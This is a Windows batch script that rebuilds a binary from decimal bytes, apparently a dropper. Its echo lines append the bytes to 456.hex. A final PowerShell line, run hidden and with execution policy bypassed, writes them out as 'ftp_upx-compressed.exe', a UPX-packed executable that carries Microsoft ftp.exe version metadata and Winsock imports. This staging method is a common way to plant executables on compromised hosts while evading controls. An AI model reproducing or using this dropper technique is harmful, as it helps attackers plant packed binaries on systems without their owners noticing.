echo|set /p=219 186 101 22 141 83 88 158 236 225 108 65 97 1 45 103 43 183 221 140 109 86 202 117 50 17 79 112 90 75 101 99 46 198 176 121 14 107 15 100 85 179 217 34 108 10 114 171 68 46 224 2 30 183 173 113 118 102 112 30 95 102 9 95 119 39 127 119 173 237 7 95 103 42 121 228 114 103 115 14 67 95 115 248 144 110 111 84 99 105 102 162 95 104 103 95 88 99 186 178 155 80 41 38 57 101 120 6 99 205 117 166 193 7 105 240 24 109 10 109 201 108 109 216 115 103 30 70 >>456.hex
echo|set /p=130 117 151 118 132 127 173 104 5 55 99 111 109 109 248 95 102 7 32 162 227 11 35 95 153 95 229 63 132 159 5 1 63 116 110 64 64 89 65 88 88 90 166 195 30 251 105 115 100 105 103 79 118 115 110 187 99 38 51 20 146 181 107 6 203 59 6 6 86 114 46 89 14 209 202 249 38 219 134 253 216 119 176 109 98 115 99 104 8 93 95 28 221 251 55 172 119 44 19 110 98 99 110 98 166 110 217 182 187 181 111 7 33 111 105 69 102 108 190 104 32 109 33 86 51 97 102 245 >>456.hex
echo|set /p=45 112 162 120 141 119 120 237 208 204 13 28 205 222 172 130 24 15 142 140 176 185 183 22 114 117 173 39 114 1 112 109 181 72 11 92 99 106 40 134 106 90 251 28 175 70 44 63 115 95 24 232 96 11 193 238 25 102 101 111 148 113 121 8 39 60 215 228 109 112 249 87 95 102 54 217 220 172 99 109 235 64 118 210 118 195 14 165 142 50 247 27 99 119 242 195 182 241 162 82 108 237 107 18 117 112 112 199 216 108 35 246 98 84 82 95 207 173 205 102 51 212 237 123 72 215 89 204 >>456.hex
echo|set /p=208 186 116 8 109 28 167 7 24 205 102 195 185 13 189 86 57 232 1 84 186 88 133 141 114 41 115 185 63 248 95 153 103 195 229 99 53 188 69 2 77 99 28 120 97 19 168 79 60 111 182 6 136 120 17 181 65 37 80 187 216 182 105 24 255 19 2 13 209 138 101 105 101 217 54 3 212 15 1 2 18 16 150 101 89 150 151 4 115 8 21 6 89 182 101 89 22 2 23 54 55 57 194 152 161 16 142 2 54 9 172 13 101 187 108 16 3 2 15 104 87 255 157 32 226 83 65 82 >>456.hex
echo|set /p=254 1 240 228 4 24 8 228 169 64 254 48 8 240 136 156 16 8 40 8 24 255 14 136 90 188 21 100 134 5 0 149 168 231 76 88 192 239 102 120 122 0 34 0 11 2 9 84 1 231 88 192 138 20 100 151 178 109 194 100 197 16 62 236 1 3 86 46 221 88 0 96 7 4 111 99 216 11 56 44 224 64 129 141 32 117 91 200 150 45 6 10 8 128 75 119 123 150 161 140 64 63 192 7 7 48 44 80 223 195 178 4 31 145 216 51 21 186 171 4 42 239 160 184 163 156 3 87 >>456.hex
echo|set /p=216 193 100 216 4 39 46 171 144 189 32 187 144 174 158 251 47 4 187 141 187 194 96 46 100 120 97 11 132 120 69 93 216 37 108 164 39 64 102 115 111 214 78 112 40 187 195 39 6 149 74 156 146 172 64 46 185 138 0 27 123 207 11 235 243 79 178 39 105 154 155 233 101 194 39 152 1 80 2 188 253 166 164 186 66 27 232 166 18 45 87 1 0 0 0 247 148 6 64 2 0 0 255 0 0 0 0 0 0 0 0 0 83 86 87 85 72 141 53 133 174 255 255 72 141 190 0 240 >>456.hex
echo|set /p=254 255 87 49 219 49 201 72 131 205 255 232 80 0 0 0 1 219 116 2 243 195 139 30 72 131 238 252 17 219 138 22 243 195 72 141 4 47 131 249 5 138 16 118 33 72 131 253 252 119 27 131 233 4 139 16 72 131 192 4 131 233 4 137 23 72 141 127 4 115 239 131 193 4 138 16 116 16 72 255 192 136 23 131 233 1 138 16 72 141 127 1 117 240 243 195 252 65 91 235 8 72 255 198 136 23 72 255 199 138 22 1 219 117 10 139 30 72 131 238 252 17 219 138 22 114 230 141 >>456.hex
echo|set /p=65 1 65 255 211 17 192 1 219 117 10 139 30 72 131 238 252 17 219 138 22 115 235 131 232 3 114 23 193 224 8 15 182 210 9 208 72 255 198 131 240 255 15 132 58 0 0 0 72 99 232 141 65 1 65 255 211 17 201 65 255 211 17 201 117 24 137 193 131 192 2 65 255 211 17 201 1 219 117 8 139 30 72 131 238 252 17 219 115 237 72 129 253 0 243 255 255 17 193 232 58 255 255 255 235 131 94 72 137 247 185 0 160 0 0 178 2 72 137 251 235 44 138 7 72 131 199 1 >>456.hex
echo|set /p=60 128 114 10 60 143 119 6 128 127 254 15 116 6 44 232 60 1 119 35 56 23 117 31 139 7 37 0 255 255 255 15 200 41 248 1 216 171 72 131 233 4 138 7 72 131 199 1 72 255 201 117 217 235 5 72 255 201 117 190 72 131 236 40 72 141 190 0 80 1 0 139 7 9 192 116 86 139 95 4 72 141 140 48 0 119 1 0 72 1 243 72 131 199 8 255 150 140 119 1 0 72 149 138 7 72 255 199 8 192 116 215 121 10 72 15 183 23 72 131 199 2 235 10 72 137 249 72 >>456.hex
echo|set /p=137 250 255 200 242 174 72 137 233 255 150 148 119 1 0 72 9 192 116 9 72 137 3 72 131 195 8 235 202 255 166 180 119 1 0 72 131 196 40 72 131 199 4 72 141 94 252 49 192 138 7 72 255 199 9 192 116 35 60 239 119 17 72 1 195 72 139 3 72 15 200 72 1 240 72 137 3 235 224 36 15 193 224 16 102 139 7 72 131 199 2 235 225 72 139 174 156 119 1 0 72 141 190 0 240 255 255 187 0 16 0 0 80 73 137 225 65 184 4 0 0 0 72 137 218 72 137 249 >>456.hex
echo|set /p=72 131 236 32 255 213 72 141 135 23 2 0 0 128 32 127 128 96 40 127 76 141 76 36 32 77 139 1 72 137 218 72 137 249 255 213 72 131 196 40 93 95 94 91 72 141 68 36 128 106 0 72 57 196 117 249 72 131 236 128 233 163 35 255 255 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 232 0 0 128 40 0 0 128 16 0 0 0 104 0 0 128 24 0 0 0 168 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 1 0 0 0 64 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 88 0 0 0 248 70 1 0 200 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 1 0 0 0 128 0 0 128 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 152 0 0 0 244 128 1 0 136 3 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 1 0 0 0 192 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 216 0 0 0 128 132 1 0 127 2 0 0 0 0 0 0 0 0 0 0 3 0 77 0 85 0 73 0 112 67 1 0 136 3 52 0 0 0 86 0 83 0 95 0 >>456.hex
echo|set /p=86 0 69 0 82 0 83 0 73 0 79 0 78 0 95 0 73 0 78 0 70 0 79 0 0 0 0 0 189 4 239 254 0 0 1 0 1 0 6 0 106 68 177 29 1 0 6 0 106 68 177 29 63 0 0 0 0 0 0 0 4 0 4 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 230 2 0 0 1 0 83 0 116 0 114 0 105 0 110 0 103 0 70 0 105 0 108 0 101 0 73 0 110 0 102 0 111 0 0 0 194 2 0 0 1 0 48 0 52 0 48 0 >>456.hex
echo|set /p=57 0 48 0 52 0 66 0 48 0 0 0 76 0 22 0 1 0 67 0 111 0 109 0 112 0 97 0 110 0 121 0 78 0 97 0 109 0 101 0 0 0 0 0 77 0 105 0 99 0 114 0 111 0 115 0 111 0 102 0 116 0 32 0 67 0 111 0 114 0 112 0 111 0 114 0 97 0 116 0 105 0 111 0 110 0 0 0 84 0 22 0 1 0 70 0 105 0 108 0 101 0 68 0 101 0 115 0 99 0 114 0 105 0 112 0 116 0 105 0 111 0 110 0 0 0 0 0 >>456.hex
echo|set /p=70 0 105 0 108 0 101 0 32 0 84 0 114 0 97 0 110 0 115 0 102 0 101 0 114 0 32 0 80 0 114 0 111 0 103 0 114 0 97 0 109 0 0 0 114 0 41 0 1 0 70 0 105 0 108 0 101 0 86 0 101 0 114 0 115 0 105 0 111 0 110 0 0 0 0 0 54 0 46 0 49 0 46 0 55 0 54 0 48 0 49 0 46 0 49 0 55 0 53 0 49 0 52 0 32 0 40 0 119 0 105 0 110 0 55 0 115 0 112 0 49 0 95 0 114 0 116 0 >>456.hex
echo|set /p=109 0 46 0 49 0 48 0 49 0 49 0 49 0 57 0 45 0 49 0 56 0 53 0 48 0 41 0 0 0 0 0 48 0 8 0 1 0 73 0 110 0 116 0 101 0 114 0 110 0 97 0 108 0 78 0 97 0 109 0 101 0 0 0 102 0 116 0 112 0 46 0 101 0 120 0 101 0 0 0 128 0 46 0 1 0 76 0 101 0 103 0 97 0 108 0 67 0 111 0 112 0 121 0 114 0 105 0 103 0 104 0 116 0 0 0 169 0 32 0 77 0 105 0 99 0 114 0 >>456.hex
echo|set /p=111 0 115 0 111 0 102 0 116 0 32 0 67 0 111 0 114 0 112 0 111 0 114 0 97 0 116 0 105 0 111 0 110 0 46 0 32 0 65 0 108 0 108 0 32 0 114 0 105 0 103 0 104 0 116 0 115 0 32 0 114 0 101 0 115 0 101 0 114 0 118 0 101 0 100 0 46 0 0 0 56 0 8 0 1 0 79 0 114 0 105 0 103 0 105 0 110 0 97 0 108 0 70 0 105 0 108 0 101 0 110 0 97 0 109 0 101 0 0 0 102 0 116 0 112 0 46 0 >>456.hex
echo|set /p=101 0 120 0 101 0 0 0 106 0 37 0 1 0 80 0 114 0 111 0 100 0 117 0 99 0 116 0 78 0 97 0 109 0 101 0 0 0 0 0 77 0 105 0 99 0 114 0 111 0 115 0 111 0 102 0 116 0 174 0 32 0 87 0 105 0 110 0 100 0 111 0 119 0 115 0 174 0 32 0 79 0 112 0 101 0 114 0 97 0 116 0 105 0 110 0 103 0 32 0 83 0 121 0 115 0 116 0 101 0 109 0 0 0 0 0 66 0 15 0 1 0 80 0 114 0 111 0 >>456.hex
echo|set /p=100 0 117 0 99 0 116 0 86 0 101 0 114 0 115 0 105 0 111 0 110 0 0 0 54 0 46 0 49 0 46 0 55 0 54 0 48 0 49 0 46 0 49 0 55 0 53 0 49 0 52 0 0 0 0 0 68 0 0 0 1 0 86 0 97 0 114 0 70 0 105 0 108 0 101 0 73 0 110 0 102 0 111 0 0 0 0 0 36 0 4 0 0 0 84 0 114 0 97 0 110 0 115 0 108 0 97 0 116 0 105 0 111 0 110 0 0 0 0 0 9 4 176 4 240 64 1 0 >>456.hex
echo|set /p=60 63 120 109 108 32 118 101 114 115 105 111 110 61 34 49 46 48 34 32 101 110 99 111 100 105 110 103 61 34 85 84 70 45 56 34 32 115 116 97 110 100 97 108 111 110 101 61 34 121 101 115 34 63 62 13 10 60 33 45 45 32 67 111 112 121 114 105 103 104 116 32 40 99 41 32 77 105 99 114 111 115 111 102 116 32 67 111 114 112 111 114 97 116 105 111 110 32 45 45 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 >>456.hex
echo|set /p=109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 34 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 34 49 46 48 34 62 32 13 10 32 32 60 97 115 115 101 109 98 108 121 73 100 101 110 116 105 116 121 32 118 101 114 115 105 111 110 61 34 49 46 48 46 48 46 48 34 32 112 114 111 99 101 115 115 111 114 65 114 99 104 105 116 101 99 116 117 114 101 61 34 97 109 100 54 52 34 32 110 97 109 101 61 34 70 84 80 >>456.hex
echo|set /p=34 32 116 121 112 101 61 34 119 105 110 51 50 34 47 62 32 13 10 32 32 60 100 101 115 99 114 105 112 116 105 111 110 62 70 84 80 46 101 120 101 32 76 85 65 32 109 97 110 105 102 101 115 116 60 47 100 101 115 99 114 105 112 116 105 111 110 62 32 13 10 32 32 60 33 45 45 32 73 100 101 110 116 105 102 121 32 116 104 101 32 97 112 112 108 105 99 97 116 105 111 110 32 115 101 99 117 114 105 116 121 32 114 101 113 117 105 114 101 109 101 110 116 115 46 32 45 45 >>456.hex
echo|set /p=62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 >>456.hex
echo|set /p=105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 34 97 115 73 110 118 111 107 101 114 34 32 117 105 65 99 99 101 115 115 61 34 102 97 108 115 101 34 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 13 10 13 10 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 20 136 1 0 140 135 1 0 0 0 0 0 0 0 0 0 0 0 0 0 33 136 1 0 196 135 1 0 0 0 0 0 0 0 0 0 0 0 0 0 46 136 1 0 212 135 1 0 0 0 0 0 0 0 0 0 0 0 0 0 57 136 1 0 228 135 1 0 0 0 0 0 0 0 0 0 0 0 0 0 69 136 1 0 244 135 1 0 0 0 0 0 0 0 0 0 0 0 0 0 80 136 1 0 4 136 1 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 90 136 1 0 0 0 0 0 104 136 1 0 0 0 0 0 120 136 1 0 0 0 0 0 136 136 1 0 0 0 0 0 150 136 1 0 0 0 0 0 164 136 1 0 0 0 0 0 0 0 0 0 0 0 0 0 178 136 1 0 0 0 0 0 0 0 0 0 0 0 0 0 192 136 1 0 0 0 0 0 0 0 0 0 0 0 0 0 198 136 1 0 0 0 0 0 0 0 0 0 0 0 0 0 208 136 1 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 111 0 0 0 0 0 0 128 0 0 0 0 0 0 0 0 75 69 82 78 69 76 51 50 46 68 76 76 0 65 68 86 65 80 73 51 50 46 100 108 108 0 109 115 118 99 114 116 46 100 108 108 0 77 83 87 83 79 67 75 46 100 108 108 0 85 83 69 82 51 50 46 100 108 108 0 87 83 50 95 51 50 46 100 108 108 0 0 76 111 97 100 76 105 98 114 97 114 121 65 0 0 71 101 116 80 114 111 99 65 100 100 114 101 115 115 0 0 86 105 114 116 117 97 >>456.hex
echo|set /p=108 80 114 111 116 101 99 116 0 0 86 105 114 116 117 97 108 65 108 108 111 99 0 0 86 105 114 116 117 97 108 70 114 101 101 0 0 0 69 120 105 116 80 114 111 99 101 115 115 0 0 0 82 101 103 67 108 111 115 101 75 101 121 0 0 0 97 116 111 105 0 0 115 95 112 101 114 114 111 114 0 0 67 104 97 114 78 101 120 116 69 120 65 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=>>456.hex
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "[string]$hex = get-content -path 456.hex;[Byte[]] $temp = $hex -split ' ';[System.IO.File]::WriteAllBytes('ftp_upx-compressed.exe', $temp)"
